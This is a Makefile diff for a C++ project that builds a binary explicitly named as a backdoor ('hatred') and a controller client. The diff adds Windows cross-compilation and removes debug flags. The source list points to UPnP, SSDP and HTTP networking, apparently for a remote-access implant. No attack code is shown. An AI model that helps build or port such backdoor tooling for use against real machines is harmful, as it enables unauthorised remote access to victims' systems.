@@ -1,5 +1,13 @@
+CXX_COMMON_ARGS= -O3 -fpermissive --std=c++23
+ifdef WINDOWS
+CXX=      x86_64-w64-mingw32-g++
+CXX_LIBS= -lws2_32
+CXX_ARGS= ${CXX_COMMON_ARGS}
+else
 CXX=      g++
-CXX_ARGS= -ggdb -O3 -fpermissive -DDEBUG --std=c++23
+CXX_LIBS= 
+CXX_ARGS= ${CXX_COMMON_ARGS}
+endif
 
 BACKDOOR_OBJS = \
 	build/backdoor/main.o \
@@ -29,10 +37,10 @@ backdoor: out/hatred
 client: out/hatredctl
 
 out/hatred: $(BACKDOOR_OBJS)
-	$(CXX) $(CXX_ARGS) $(BACKDOOR_OBJS) -o out/hatred
+	$(CXX) $(CXX_ARGS) $(BACKDOOR_OBJS) ${CXX_LIBS} -o out/hatred
 
 out/hatredctl: $(CLIENT_OBJS)
-	$(CXX) $(CXX_ARGS) $(CLIENT_OBJS) -o out/hatredctl
+	$(CXX) $(CXX_ARGS) $(CLIENT_OBJS) ${CXX_LIBS} -o out/hatredctl
 
 build/backdoor/main.o: src/backdoor/main.cc src/backdoor/net.h src/common/util.h src/backdoor/upnp.h src/backdoor/http.h src/backdoor/ssdp.h src/backdoor/xml.h src/proto/proto.h
 	mkdir -p build/backdoor/
